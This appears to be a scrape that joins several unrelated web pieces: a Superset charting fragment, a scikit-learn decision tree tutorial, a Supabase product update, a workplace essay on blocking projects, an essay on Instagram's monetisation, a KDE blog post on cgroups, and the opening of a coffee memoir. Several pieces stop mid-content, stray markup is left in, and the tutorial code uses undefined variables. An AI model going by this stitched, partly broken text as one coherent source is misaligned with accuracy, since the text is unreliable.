<p>However, adding too many series (e.g., many distinct values in the Group By field) could make it difficult to understand and conceptualize the series. In this case, it is useful to use Series Limit to reduce the number of series.</p>

<h2 id="area-chart"><a href="#area-chart" aria-label="area chart permalink"></a>Area Chart</h2>
<p>Area chart are similar to line chart in that they represent variables with the same scale, but area charts stack the metrics on top of each other. An area chart in Superset can be stream, stack, or expand.</p>
<p>By simply changing the Visualization Type, we can display the line chart above as an area chart</p>

<p>Sometimes when looking at data points on a per day basis, it is difficult to determine trends and data variance. For example, the chart below shows the top American states with new Covid-19 cases on a per day basis (taken over the last month). This view makes it difficult to discern a clear trend.</p>

<p>In order to gain a greater insight into this data, we recommend smoothing out the short-term fluctuations between data points by applying a moving average. The moving average—available in the <em>Advance Analytics function</em>—applies the average between defined X periods instead of marking actual data points by date.</p>
<p>If we apply this technique to the previous chart by using the moving average over the last 7 days, the lines in the chart will be smoothed out and facilitate the recognition of trends.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
			<p>In this post we are going to see how to build a basic decision tree classifier using scikit-learn package and how to use it for doing multi-class classification on a dataset.</p>

<p>Decision trees is an efficient and non-parametric method that can be applied either to classification or to regression tasks.</p>

<p>To predict the dependent variable the input space is split into local regions because they are hierarchical data structures for supervised learning</p>

<p>Decision tree is a simple to learn and easy to interpret and Visualize the decisions in a tree format. It has the advantage of producing comprehensible classification/regression model with satisfactory accuracy level.</p>

<p>We will be exploring the DecisionTreeClassifier function of sklearn and all the parameters of it. You will also see how to Visualize the decision tree Rules and the Boundaries that model is creating to classify the different Classes(targets)</p>

<h2 id="decision-tree-classifier-in-sklearn"><strong>Decision Tree Classifier in Sklearn</strong></h2>

<div><div><pre><code>sklearn.tree.DecisionTreeClassifier(_criterion='gini'_,&nbsp;_splitter='best'_,&nbsp;_max_depth=None_,
&nbsp;
_min_samples_split=2_,&nbsp;_min_samples_leaf=1_,&nbsp;_min_weight_fraction_leaf=0.0_,&nbsp;_max_features=None_,&nbsp;

_random_state=None_,&nbsp;_max_leaf_nodes=None_,&nbsp;_min_impurity_decrease=0.0_,&nbsp;_min_impurity_split=None_,&nbsp;

_class_weight=None_,&nbsp;&nbsp;_ccp_alpha=0.0_)
</code></pre></div></div>

<h2 id="parameters"><strong>Parameters</strong></h2>

<h3 id="criterion"><strong>criterion</strong></h3>

<p>Gini or entropy and default is Gini.</p>

<p>One of the Critical factor is to choose which feature for splitting the nodes in subsets and for making that decision we choose out of these two criteria</p>

<ul>
  <li>Information Theory (Entropy)</li>
  <li>Distance Based (Gini)</li>
</ul>

<p>Both are impurity measures and it looks like the selection of impurity measure has little effect on the performance of single decision tree algorithms</p>

<p>The impurity is measured before and after splitting a node according to each possible attribute.</p>

<p>The attribute which presents the greater gain in purity, i.e., that maximizes the difference of impurity taken before and after splitting the node, is chosen</p>

<p>Entropy might be a little slower to compute because it makes use of the logarithm</p>

<h3 id="splitter"><strong>Splitter</strong></h3>

<p>Strategy to choose out of best or random. Default is best</p>

<p>If the best strategy is chosen then it will split on the most important feature first</p>

<p>it will choose a feature on random for splitting the node if splitter set to random which could lead to accuracy and more depth in the decision tree</p>

<h3 id="max_depth"><strong>max_depth</strong></h3>

<p>The maximum depth of the tree.</p>

<p>One of the stopping criteria that let you decide when to terminate the tree building process. A tree can be grown until a maximum depth is reached.</p>

<p>A tree can be grown to a maximum depth of N-1 where N is the number of samples</p>

<p>Beside max_depth there are other stopping criteria as well so in reality a tree will never go a maximum depth of N-1</p>

<p>Mostly we try to pick the optimal depth based on cross-validation and decides the reasonable max_depth value</p>

<h3 id="min_samples_split"><strong>min_samples_split</strong></h3>

<p>The minimum number of samples required at an Internal node for splitting. Say for example min_samples_split = 5 and there are 8 samples at a decision node then the split is allowed otherwise if &lt;5 then not allowed.</p>

<p>if <strong>min_sample_leaf</strong> = 2 and one leaf has 1 sample and other has 6 samples then the split is not allowed</p>

<p>so min_samples_split depends on the min-sample_leaf defined as well</p>

<p><img src="https://kanoki.org/images/2020/05/image-6.png" alt=""></p>

<h3 id="min_samples_leaf"><strong>min_samples_leaf</strong></h3>

<p>The minimum number of samples required at a leaf node</p>

<h3 id="min_weight_fraction_leaf"><strong>min_weight_fraction_leaf</strong></h3>

<p>The minimum weighted fraction</p>

<div><div><pre><code>`fit`(_self_,&nbsp;_X_,&nbsp;_y_,&nbsp;_sample_weight=None_,&nbsp;_check_input=True_,&nbsp;_X_idx_sorted=None_)
</code></pre></div></div>

<p>this parameter decides the required fraction of samples (or weights) in each leaf node</p>

<p>It uses the weight defined for each sample thru the fit method that has a <strong>sample_weight</strong> which lets you specify the weight of each of the samples and accepts values in an array like format for n_samples</p>

<p>if a minimum weight fraction is set and the sample weight is None then it will assume a uniform weight for all the samples</p>

<h3 id="max_features"><strong>max_features</strong></h3>

<p>It defines the number of features to be used for best split.</p>

<p>It is used to control the over-fitting. For example if the shape of your data is 30 and max_feature is set to 5.</p>

<p>So Every time at a decision node you will choose maximum of 5 features that are selected randomly for splitting</p>

<h3 id="random_state"><strong>random_state</strong></h3>

<p>It is the seed used by the random number generator. it is basically used to make the result or outcome of the classifier consistent.</p>

<p>It hardly matters what number you select but if you select the same number each time then the output remains deterministic</p>

<h3 id="max_leaf_node"><strong>max_leaf_node</strong></h3>

<p>maximum leaf node. It is one of the stopping criteria to grow a tree wih max_leaf_node.</p>

<p>By default it is set to None which means it will grow to unlimited leaf nodes and other stopping criteria will be considered</p>

<p>from the official <a href="https://scikit-learn.org/stable/modules/generated/sklearn.tree.DecisionTreeClassifier.html">documentation</a> the formula for weighted impurity decrease is as follows:</p>

<div><div><pre><code>N_t / N * (impurity - N_t_R / N_t * right_impurity
                    - N_t_L / N_t * left_impurity)
</code></pre></div></div>

<p>This formula takes into account how much the parent node makes up of the total tree (N_t / N) and the weighted impurity decrease from the child nodes.</p>

<p>If the final impurity decrease is less than the minimum impurity decrease parameter, then the split will not be performed</p>

<h3 id="class_weight"><strong>class_weight</strong></h3>

<p>By default all the classes have same weight i.e. 1</p>

<p>The class_weight parameter deals well with unbalanced classes by giving
more weight to the under represented classes.</p>

<p>It is used for re-weighting the splitting criterion</p>

<p>Higher the class_weight more you want to put emphasis on that class.</p>

<p>For multi-output, class_weights will be multiplied with <strong>sample_weight</strong> (passed through the fit method) if <strong>sample_weight</strong> is specified</p>

<h2 id="get-started"><strong>Get Started</strong></h2>

<p>We will use the wine dataset from sklearn.</p>

<p>Let’s load the data and then will split into train and test sets</p>

<div><div><pre><code>from sklearn import datasets
from sklearn.tree import DecisionTreeClassifier
wine_data = datasets.load_wine()
</code></pre></div></div>

<p>Let’s check out the important keys in this dataset</p>



<div><div><pre><code>dict_keys(['data', 'target', 'target_names', 'DESCR', 'feature_names'])
</code></pre></div></div>

<p>So we have data, target variables with their names stored in target_names and feature names</p>

<p>Let’s find out the features in the data that we will use to train the decision tree classifier</p>



<div><div><pre><code>['alcohol',
 'malic_acid',
 'ash',
 'alcalinity_of_ash',
 'magnesium',
 'total_phenols',
 'flavanoids',
 'nonflavanoid_phenols',
 'proanthocyanins',
 'color_intensity',
 'hue',
 'od280/od315_of_diluted_wines',
 'proline']
</code></pre></div></div>

<p>Here are the different classes or targets in which each of these data is classified to i.e. class_0, class_1 and class_2</p>



<div><div><pre><code>**array(['class_0', 'class_1', 'class_2'], dtype='&lt;U7')**
</code></pre></div></div>

<p>Finally lets check the data by importing it into a Dataframe object. So you can visualize how the data looks like</p>

<div><div><pre><code>import pandas as pd
pd.DataFrame(wine_data.data,columns=wine_data.feature_names)
</code></pre></div></div>

<p>We can see there are 178 rows and 13 features in this dataset.</p>

<p><img src="https://kanoki.org/images/2020/05/image-7.png" alt=""></p>

<h2 id="train-test-split"><strong>Train Test Split</strong></h2>

<p>We have split the data into training and test set using sklearn train_test_split</p>

<div><div><pre><code>from sklearn.model_selection import train_test_split
X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.3,
stratify=y)
</code></pre></div></div>

<h2 id="accuracy-score-and-cross-validation"><strong>Accuracy Score and Cross Validation</strong></h2>

<p>Lets measure the testing accuracy using sklearn accuracy_score.</p>

<p>For that we are going to instantiate the Decision tree classifier and then use the fit method on Train data.</p>

<p>Predict method of decision tree classifier will find the target class for the test data</p>

<p>Finally we will calculate the accuracy on our test data prediction</p>

<div><div><pre><code>from sklearn.metrics import accuracy_score

clf = DecisionTreeClassifier() #Instantiate Decision tree classifier
clf.fit(X_train, y_train)      # Use fit method on the train data

y_pred = clf.predict(X_test)   # Predict the target class of test data
accuracy_score(y_test, y_pred)  # Measure Accuracy
</code></pre></div></div>

<p>Let’s evaluate the cross validation score as well</p>

<div><div><pre><code>from sklearn.model_selection import cross_val_score
scores = cross_val_score(clf, X_test, y_test, cv=5)
print("Accuracy: %0.2f (+/- %0.2f)" % (scores.mean(), scores.std() * 2))
</code></pre></div></div>

<h2 id="visualize-decision-tree-using-plot_tree"><strong>Visualize Decision Tree using plot_tree</strong></h2>

<p>You can also Visualize the final decision tree by using the plot_tree function of the sklearn.</p>

<p>There are other ways to visualize using pydot and graphviz but I’m not going to discuss those methods in this post</p>

<div><div><pre><code>%matplotlib inline
from matplotlib.pyplot import figure
from sklearn.tree import plot_tree
figure(num=None, figsize=(20, 6), dpi=80, facecolor='w', edgecolor='k')
plot_tree(clf.fit(wine_data.data, wine_data.target))
</code></pre></div></div>

<p><img src="https://kanoki.org/images/2020/05/image.png" alt=""></p>

<h2 id="gridsearchcv"><strong>GridSearchCV</strong></h2>

<p>Hyper parameters selection is an important part for model selection. how would you know what combinations of these parameters will give you the best outcome?</p>

<p>One way is randomly selecting these values and see which combinations of parameters will give best result.</p>

<p>Isn’t that tedious to do? So Grid Search in Scikit-learn exactly does the same thing and helps to find the best estimator</p>

<div><div><pre><code>from sklearn.model_selection import GridSearchCV, cross_val_score
param_grid = {'criterion':['gini','entropy'], 'max_depth' :
[3,5,7,20]}
grid_search = GridSearchCV(clf,param_grid=param_grid,cv=5)
grid_search.fit(X_train, y_train)
</code></pre></div></div>

<p><img src="https://kanoki.org/images/2020/05/image-1.png" alt=""></p>

<p>You can see all the criteria and their respective score that gridsearch used to evaluate the best estimate by accessing the params and mean_test_score of grid search object</p>

<p>The params and the mean_test_score keys will give you the parameters and their corresponding results</p>

<div><div><pre><code>grid_search.cv_results_['params']
grid_search.cv_results_['mean_test_score']
</code></pre></div></div>

<div><div><pre><code>([{'criterion': 'gini', 'max_depth': 3},
  {'criterion': 'gini', 'max_depth': 5},
  {'criterion': 'gini', 'max_depth': 7},
  {'criterion': 'gini', 'max_depth': 20},
  {'criterion': 'entropy', 'max_depth': 3},
  {'criterion': 'entropy', 'max_depth': 5},
  {'criterion': 'entropy', 'max_depth': 7},
  {'criterion': 'entropy', 'max_depth': 20}],

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><p>We're now 4 months into building <a href="https://supabase.io/">Supabase</a>, which means another major update. Here's a few things we think you'll love in this release.</p><h3>4 minute demo</h3><p>Watch a full demo:</p><h3>View relational data</h3><p>We're sometimes asked how we will make Postgres as simple as Firebase, since Postgres is a relational database. This month we're making our first steps to prove that relational databases can be even easier to use than document stores. We're releasing an excel-like editing interface which can drill down into your relational data.</p><h3>Manage JSON data</h3><p>Postgres is an amazing database, giving the flexibility of a document store with the power of a RDBMS. If you use <code>JSON</code> data in Postgres, then we want to make that easy too. Supabase detects when your column is <code>JSON</code> or <code>JSONB</code>, and provides an easy way to edit and view your data. More improvements coming soon for this feature!</p><h3>Choose your region</h3><p>If you noticed a bit of latency on Supabase, it's because your projects were previously set up in Singapore. It was always our intention that you'd be able to choose your database region, and this month we've delivered it. In the next releases we'll even allow you to go multi-region, instantly replicating your database close to your customers.</p><h3>Backups</h3><p>A guiding principle at Supabase is zero lock-in. So this month we are exposing your daily database backups on the dashboard, giving you a simple way to migrate off Supabase. We have a lot more to build in this space (<code>WAL-G!</code>), so watch this space.</p><h3>Kaizen</h3><p>We have a number of small improvements:</p><ul><li>Improved SQL editor - with better syntax highlighting</li><li>Improved API docs - with more code snippets</li><li>UX improvements - with a simplified and consistent UX</li></ul><h3>Hiring</h3><ul><li>This month we <a href="https://supabase.io/blog/2020/06/15/supabase-steve-chavez">welcome Steve Chavez to the team</a>. Steve is a maintainer of PostgREST, one of the core tools which makes Supabase possible. </li><li>We're hiring a part-time designer or UX expert. See more <a href="https://news.ycombinator.com/item?id=23708351" target="_blank" rel="noopener noreferrer">here</a>.</li></ul><h3>Get started</h3><ul><li>Start using Supabase today: <a href="https://app.supabase.io/">app.supabase.io</a></li><li>Make sure to <a href="https://github.com/supabase/supabase" target="_blank" rel="noopener noreferrer">star us on GitHub</a></li><li>Follow us <a href="https://twitter.com/supabase_io" target="_blank" rel="noopener noreferrer">on Twitter</a></li><li>Become a <a href="https://github.com/sponsors/supabase" target="_blank" rel="noopener noreferrer">sponsor</a></li></ul></section></div>]]>

    <p>One of the most frustrating and common experiences in the workplace is getting work blocked near the finish line. Examples:</p>
<ul>
  <li>A feature is developed over the course of 3 months. In the launch meeting a manager swoops in and declares it can’t be released for security reasons.</li>
  <li>You ask your manager for feedback on a proposal. They don’t respond. You ask again. They give a cursory glance and say “looks good”. A week later you say you’re ready to send it out. Suddenly they flood the document with feedback which ruins your timeline.</li>
  <li>An entire division works on a project for weeks. The minute they make it live the VP of the division storms in and yells “revert!”. The VP is displeased with the styling and insists it can’t be shipped that way.</li>
</ul>

<p>There’s usually one of 3 main causes for this anti-pattern:</p>
<ul>
  <li>Problem 1: Laziness/mis-calculation/ego. The stakeholder thinks it’s more efficient for them to engage with something closer to the finish line than early stage. This is often a gross mis-calculation. Projects are like cruise ships - you want to get to your destination with a lot of little steering along the way, not heroics after things have veered off course.</li>
  <li>Problem 2: Bad process. A critical stakeholder isn’t procedurally involved at the right time. If you find yourself blocking projects regularly, it’s your responsibility to fix this. <a href="https://staysaasy.com/process/2020/04/06/Creating-Good-Process.html">Create good process</a>.</li>
  <li>Problem 3: Micromanagement. The project/proposal didn’t actually need the manager’s feedback, they just can’t help having to put their stamp on everything.</li>
</ul>

<p>The solutions are simple but hard to master:</p>
<ul>
  <li>Answer 1: If you don’t think you need to be involved early, imagine the project goes live without your feedback at all. If you’re comfortable with that, you probably don’t need to be involved early (or at all). If you do need to give feedback, do it early and along the way.</li>
  <li>Answer 2: Make sure you have a process that involves necessary stakeholders at the right time.</li>
  <li>Answer 3: Don’t micromanage.</li>
</ul>

<p>If you mess up and find yourself giving major feedback near the finish line of a project, find ways to say yes and make sure you’re empathizing with the frustration that’s resulting from the late stage changes.</p>



<p>Some people actually take pride in blocking projects. Stakeholders who repeatedly view themselves as “saving the day” when it comes to tanking momentum and releases. They see themselves as a fountain of unique knowledge that prevent disasters.</p>

<p>This is almost always a result of incentives that are grossly mis-aligned. Some organizations have stakeholders who show up late in the game, who are not responsible for other teams being productive, who have 0 incentive to facilitate work and all the incentive to block things.</p>

<p>Companies should incentivize these stakeholders not only for preventing problematic releases, but also for the amount of things teams can get done to their requirements.  This ties their success to both risk management and enablement.</p>

<p>When it comes to the most popular platforms in the world, the motives behind certain feature roll-outs or a lack of early monetisation often seems to elude logic. Why hasn’t Whatsapp enabled payments sooner and Twitter moved toward monetisation more aggressively? Why did Facebook quietly roll back its influencer platform a few years ago? More recently, I find myself questioning why Instagram waited years to introduce the Checkout function that would have made it an intimidating e-commerce competitor much earlier in the game.&nbsp;</p>



<p>All of these seemingly spotlight decisions fall into a deliberate strategy tied to the lifeblood of these platforms, social capital. The long game is to cultivate social capital, gamify its distribution and eventually convert it into economic capital. Although social capital, in essence, is ephemeral and intangible, society’s collective agreement that it holds value makes it so – much like money. In that sense, Social Media did for social capital what fiat did for economic capital. No longer as difficult to quantify, it has become the world’s mirror economy with value as tangible to an individual as monetary worth. The most explicit manifestation of this has been the rise of the influencer economy, the traditionally unspoken dynamics of social hierarchies and celebrity culture on steroids and now accessible to the masses.&nbsp;</p>



<p>For social media platforms, social capital is the fuel in their engine. Their business is the pursuit of the perpetual growth of collective social capital on their platform. As the platforms reach stages of greater maturity, the conversion funnel reaches its final stages as well – the very stage Instagram is at the beginning of right now as it attempts to complete the loop of social to economic value creation. In essence, this is the fluid direction of influencer recommendations into convertible commercial transactions within the app. But the question remains – could Instagram have implemented this feature successfully years before this point? The science behind this kind of decision is delicate, social capital must be cultivated and morphed in a way that value is not depleted from or ported away from the platform. Flow theory, a psychological concept of the mind’s ideal state of engagement provides a contextual model for how social media platforms like Instagram have achieved this balance.&nbsp;</p>



<h3>Gamifying social capital: creating a state of flow&nbsp;</h3>



<p>Flow theory, a broader psychological theory on how the optimal balance of skill and challenge creates a state of complete immersion is a core focus of gamification as it is applied in gaming itself, but also across various industries. When it comes to social media, platforms have built their networks through the gamification of social capital, building an immersive and engaging game-like experience around the act of accruing social capital – “how many likes did it get?” now a popular criteria for validity. Both gaming and social media tactically withhold and subsequently trigger endorphins to create products that are addictive by nature.&nbsp; A comparison of how flow is cultivated across gaming and social media reveals a lot about the very habits many of us participate in, on a daily basis.&nbsp;</p>



<p><strong>Skill &amp; Challenge</strong></p>



<p><strong>In gaming –</strong> the game must produce a task challenging enough for the player but not so challenging that the player’s skill level is incapable of completing the task</p>



<p><strong>In social media:</strong> building social capital (offline or online) inherently carries a degree of challenge that requires great effort to meet. The challenge is derived from your context (i.e. your friends or others on the platform) who may have larger followings or more liked photos. As a user’s ‘success’ scales, their field of comparison grows with them, and thereby the challenge increases. This is the mechanism by which individuals are incentivised to perpetually grow their own social capital and therefore the platform’s collective capital.&nbsp;</p>



<p><strong>Engagement</strong></p>



<p><strong>In gaming:</strong> the task has to be active and engaging</p>



<p><strong>In social media:</strong> A challenge in itself is not rewarding enough to prompt or incentivise users to continue their accrual of social capital. The natural feedback loop of validation through followers, likes and other features create psychological self-fulfilment. Sometimes there is economic utility to be derived by those who seek to leverage their social capital beyond just validation. Pursuit of this feedback loop keeps the users active and engaged in the activities of the platform.&nbsp;</p>



<p><strong>Reward</strong></p>



<p><strong>In gaming –</strong> the task has to have clear parameters for success. These clear parameters help to enter and maintain a ‘flow state’ as they indicate progress and quality.</p>



<p><strong>In social media:</strong> Success on social media platforms is measured by metrics like number of followers, likes and views. For users reaping economic rewards as well, the utility of their social capital can also be measured in sponsorships, ads and other forms of social media-driven income. While the latter is not as publicly available information, both types can lead to strong signalling of one’s success on social media.&nbsp;</p>



<p><strong>Motivation</strong></p>



<p><strong>In gaming –</strong>&nbsp; the player must be intrinsically motivated to complete the task</p>



<p><strong>In social media: </strong>Where flow theory in gaming requires a complete blueprint of gamification to tap into the intrinsic motivation of players, socialising is a natural state of flow humans have always engaged in. The activity of building social capital is, for the most part, natural and instinctive especially when paired with the platform’s circular feedback loop for validation and reward.</p>



<h3>Making decisions and maintaining flow: the final stages</h3>



<p>Given that social media by its very nature can keep participants engaged without too much intervention, the most important element of gamification becomes the conversion of social capital into economic value. This has to be achieved without drowning the platform in mechanisms which disturb the state of flow already established.&nbsp;&nbsp;</p>



<p>The original set of features introduced by the platform for the accumulation of social capital has a shelf life, after which users will tire of it or reach a point of saturation that skews the effort to return balance necessary for flow. At this point platforms need to extend the avenues of creation, either by innovating existing features or introducing new features. This is the kind of thinking that drives Instagram to introduce ‘stories’ as opposed to just static posts for the feed.</p>



<p>However as the features start compounding, there is an inevitable layering of game theory mechanics which could heavily influence the state of flow. For this reason, the introduction of new features has to avoid detracting from the existing balance of social capital accumulation. If a feature presented a challenge greater than the effort or skill the user was willing to part with – participation and therefore total social capital on the platform would take a hit.&nbsp;&nbsp;&nbsp;</p>



<p>In a similar sense, the introduction of the Instagram Checkout was a thoughtful and timely implementation over many years of incremental introductions that maintained the state of flow for users. Instagram prioritised the maintenance of social capital within its ecosystem, choosing not to risk the pre-emptive roll out of a feature that would deplete social capital or endanger the state of flow it was cultivating.&nbsp;&nbsp;</p>



<p>When users began tapping into off-platform mechanisms to convert their social capital into economic capital as a result of this, Instagram didn’t put up any barriers. Instagram would have seen this as priming its users for a later stage of its own conversion funnel without taking on any of the risk of disturbing its own state of flow. In 2016, when Instagram introduced Shopping tags for feed posts and later the Shopping tab in 2018, features that led to external stores for point of purchase, it was encouraging this behaviour – all the while knowing it would eventually incorporate these tested habits back into its own environment.&nbsp;</p>



<h3>Social to economic capital: a delicate conversion</h3>



<p>Given that maintaining a state of flow is a key decision metric behind the strategies of killer platforms, a nuanced understanding of it better places us to predict how other platforms like Whatsapp and Twitter may navigate this delicate balance moving forward.&nbsp;</p>



<p>With 89% of influencers using Instagram, it ranks as the number one platform for influencer marketing – no better testament to the economic rewards Instagram will reap as it begins cashing in its unparalleled social capital. Whilst we do not have many points of comparison for social media platforms at the scale of Instagram, the social capital it has been able to accrue is an undeniably powerful metric. Instagram in 2019 brought in 20 billion USD in revenue which accounts for more than a quarter of Facebook’s revenue in that year, only projected to grow further from there.&nbsp;</p>



<p>The careful transition of Instagram towards the full conversion funnel ensures its now end to end e-commerce experience is revered as a perfectly convenient segway for users as opposed to an uncomfortable push for higher revenues.&nbsp;</p>

<h3><span>Down the Rabbit Hole</span></h3>
</p>



<h3>1. Reverse network effects and the conundrum of maintaining palatable signal to noise ratios</h3>



<p>Network effects have seen social networks grow to valuations of billions and connect millions of users. It is tempting to believe that these platforms will remain fail-proof in perpetuity. The value created in a network relies on ‘connection, content and clout’.</p>



<p>“Across these three drivers, a network with greater scale provides greater value in the form of:</p>



<ol><li>More prospective connections for the user</li><li>A larger corpus of potentially relevant content</li><li>Access to a larger base of potential followers (greater clout), for …</li></ol></div></div></div>

		<p>A desktop environment's sole role is to connect users to their applications. This includes everything from launching apps to actually displaying apps but also managing them and making sure they run fairly. Everyone is familiar the concept of a "Task manager" (like ksysguard), but over time they haven't kept up with the way applications are being developed or the latest developments from Linux.</p>

<h2>Managing running processes</h2>
<p>There used to be a time where one PID == one "application". The kwrite process represents Kwrite, the firefox process represents Firefox, easy. but this has changed. To pick an extreme example:<br>
<strong>Discord in a flatpak is 13 processes!</strong></p>
<p>It basically renders our task manager's process view unusable. All the names are random gibberish, trying to kill the application or setting nice levels becomes a guessing game.  Parent trees can help, but they only get you so far.</p>
<p>It's unusable for me, it's probably unusable for any user and gets in the way of feeling in control of your computer.</p>
<p>We need some metadata.</p>
<h2>Fair resource distribution</h2>
<p>As mentioned above discord in a flatpak is 13 processes. Krita is one process.</p>
<ul>
<li>One will be straining the CPU because it is a highly sophisticated application doing highly complicated graphic operations</li>
<li>One will be straining the CPU because it's written in electron</li>
</ul>
<p>To a kernel scheduler all it would see are 14 opaque processes. It has no knowledge that they are grouped as two different things. It won't be able to come up with something that's fair.</p>
<p>We need some metadata.</p>
<p>(caveat: Obviously most proceses are idling, and I've ignored threads for the purposes of making a point, don't write about it)</p>
<h2>It's hard to map things</h2>
<p>Currently the only metadata of the "application" is on a window.  To show a user friendly name and icon in ksysguard (or any other system monitor) we have to fetch a list of all processes, fetch a list of all windows and perform a mashup. Coming up with arbitrary heuristics for handling parent PIDs which is unstable and messy.</p>
<p>To give some different real world examples:</p>
<ul>
<li>In plasma's task manager we show an audio indicator next to the relevant window, we do this by matching PIDs of what's playing audio to the PID of a window. Easy for the simple case... however as soon as we go multi-process we have to track the parent PID, and each "fix" just alternates between one bug and another.</li>
<li>With PID namespaces apps can't correctly report client PIDs anymore.</li>
<li>We lose information on what "app" we've spawned. We have bug reports where people have two different taskmanager entries for "Firefox" and "Firefox (nightly)" however once the process is spawned that information is lost - the application reports itself as one consistent name and our taskbar gets confused.</li>
</ul>
<p>We need some metadata.</p>

<h2>This is a solved problem!</h2>
<p>A modern sysadmin doesn't deal in processes, but cgroups. The cgroup manager (which will be typically systemd) spawns each service as one cgroup. It uses cgroups to know what's running, the kernel can see what things belong together. </p>
<p>On the desktop flatpaks will spawn themselves in cgroups so that they can use the relevant namespace features.</p>
<p>You're probably already using cgroups. As part of a <a href="https://systemd.io/DESKTOP_ENVIRONMENTS">cross-desktop effort</a> we want to bring cgroups to the entire desktop.</p>
<h2>Example</h2>
<p>Before and after of our system monitor<br>
<a href="http://blog.davidedmundson.co.uk/wp-content/uploads/2020/12/old1.png"><img src="http://blog.davidedmundson.co.uk/wp-content/uploads/2020/12/old1.png" alt=""></a></p>
<p><a href="http://blog.davidedmundson.co.uk/wp-content/uploads/2020/12/ksysguardqml_apps.png"><img src="http://blog.davidedmundson.co.uk/wp-content/uploads/2020/12/ksysguardqml_apps-1024x772.png" alt=""></a></p>
<p>Ultimately the same data but way easier to read..</p>

<p>Another key part of cgroup usage is the concept of slices. Cgroups are based on a heirachical structure, with slices as logical places to split resource usage. We don't adjust resources globally, we adjust resources within our slice, which then provides information to the scheduler.</p>
<p><a href="http://blog.davidedmundson.co.uk/wp-content/uploads/2020/12/treepie.png"><img src="http://blog.davidedmundson.co.uk/wp-content/uploads/2020/12/treepie.png" alt=""></a></p>
<p>Conceptually you can imagine that we just adjust resources within our level of a tree. Then the kernel magically takes care of the rest.</p>
<p>More information can be found on slices in this excellent series <a href="https://www.redhat.com/en/blog/world-domination-cgroups-part-2-turning-knobs"> World domination with cgroups</a>.</p>
<h2>Default slices</h2>
<p>This means we can set up some predefined slices. Within the relevant user slice this will consist shared of</p>
<ul>
<li>applications</li>
<li>the system (kwin/mutter, plasmashell)</li>
<li>background services (baloo, tracker)</li>
</ul>
<p>Each of these slices can be given some default prioritisations and OOM settings out of the box.</p>
<h2>Dynamic resource shifting</h2>
<p>Now that we are using slices, and only adjusting our relative weight within the slice, we can shift resource priority to the application owning the focused window.</p>
<p>This only has any effect if your system is running at full steam from mulitple sources at once, but it can provide a slicker response at no drawback.</p>
<h2>Why slice, doesn't nice suffice?</h2>
<p>Nice is a single value, global across the entire system. Because of this user processes can only be lowered, but never raised to avoid messing with the system.  With slices we're only adjusting relative weight compared to services within our slice. So it's safe to give the user full control within their slice. Any adjustments to an application, won't impact system services or other users.</p>
<p>It also doesn't conflict with nice values set by the application explicitly. If we set kdevelop to have greater CPU weight, clang won't suddenly take over the whole computer when compiling.</p>

<h2>CGroup extra features</h2>
<p>CGroup's come with a lot of new features that aren't available on a per-process level. </p>
<p>We can:</p>
<ul>
<li>Set limits so that a CPU can't use more than N% </li>
<li>We can gracefully close processes on logout</li>
<li>We can disable networking</li>
<li>We can set memory limits</li>
<li>We can prevent forkbombs</li>
<li>We can provide hints to the OOM killer not just with a weight but with expected ranges that should be considered normal</li>
<li>We can freeze groups of processes (which will be useful for Plasma mobile)<br>
... </li>
</ul>
<p>All of this is easy to add for a user / system administrator. Using drop in's one can just add a .service file [example file link] to ~/.config/systemd/user.control/app-firefox@.service and manipulate any of these.</p>
<p>[caveat, some of those features works for applications created as new transient services, not the lite version using scopes that's currently merged in KDE/Gnome - maybe worth mentioning]</p>

<p>Plasma 5.19 and recent Gnome now spawn applications into respective cgroups, but we're not yet surfacing the results that we can get from this.</p>
<p>For the KDE devs providing the metadata is easy.</p>
<p>If spawning a new application from an existing application be sure to use either <a href="https://api.kde.org/frameworks/kio/html/classKIO_1_1ApplicationLauncherJob.html"><code>ApplicationLauncherJob</code></a> or <a href="https://api.kde.org/frameworks/kio/html/classKIO_1_1CommandLauncherJob.html"><code>CommandLauncherJob</code></a> and set the respective service. Everything else is then handled automagically. You should be using these classes anyway for spawning new services.</p>
<p>For users, you can spawn an application with either <code><code>kstart5 --application foo.desktop"</code></code></p>
<p>That change to the launching is relatively tiny, but getting to this point in Plasma wasn't easy - there were a lot of edge cases that messed up the grouping correctly.</p>
<ul>
<li>kinit, our zygote process really meddled with keeping things grouped correctly</li>
<li>drkonqi, our crash handler and application restarter</li>
<li>dbus activation has no knowledge of the associated .desktop file if an application is DBus activated (such as spectacle our screenshot tool)</li>
<li>and many many more papercuts throughout of different launches</li>
</ul>
<p>Also to fully capitalise on slices we need to move all our background processes into managed services and slices. This is worthy of another (equally lengthy) blog post.</p>
<h2>How you can help?</h2>
<p>It's been a battle to find these edge cases.<br>
Whilst running your system, please run systemd-cgls and point out any applications (not background services yet) that are not in their appropriate cgroup.</p>

<p>(e.g BSD users)</p>
<p>As we're just adding metadata, everything used now will continue to work exactly as it does now. All existing tools work exactly the same. Within our task manager we still will keep a process view (it's still useful regardless) and we won't put in any code that relies on the cgroup metadata present. We'll keep the existing heuristics for matching windows with external events, cgroup metadata would just be a strongly influence factor in that. Things won't get worse, but we won't be able to capitalise on the new features discussed here, </p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="main" role="main"> <article role="article">  <p>I never identified as a coffee snob or someone with a serious habit – like everyone else, I made lots of self-deprecating jokes about how much coffee I drank – until one day I realized that I had been drinking more coffee than anyone else I knew for the past fifteen years.</p> <p>I started drinking coffee in high school. I would stay up all night competitively playing video games, and then head to school on two or three hours of sleep. If I tried to attend class, I would immediately pass out on my desk. There was a coffee machine in the cafeteria, where I would solve that problem by purchasing a cup of scalding-hot black coffee for fifty cents. It was shitty coffee, and I hated the flavor. But I needed it, and took the bitterness as fair punishment for not sleeping. That cup got me wired – the caffeine rush would electrify my body, and my hand would shake erratic, two-inch tall letters out of my Pilot V5.</p> <p>Two hours later, I’d get another cup, and that would last me into the early afternoon. I’d crash and fall asleep in class at 1:50pm, like clockwork. I’d get another cup at 2:00pm between classes, to carry me through the rest of the day. When I took my finals before graduating, the principal sent out a grade-wide complaint that too many coffee cups got littered outside the exam rooms. They were all mine. My #1 concern in high school was dying of a heart attack due to my completely insane sleep and caffeine habits.</p> <p>Somehow I survived high school. My sleep patterns would, over the course of the years, very slowly approach those of a normal person, but coffee stuck. I would drink it to help stay up late, or to wake me up after a short night. When things got really urgent I’d supplement with some Red Bull. My tastes advanced a little bit: I quit the punitive straight black coffee, and experimented with extravagances like sugar and milk. As I started to work 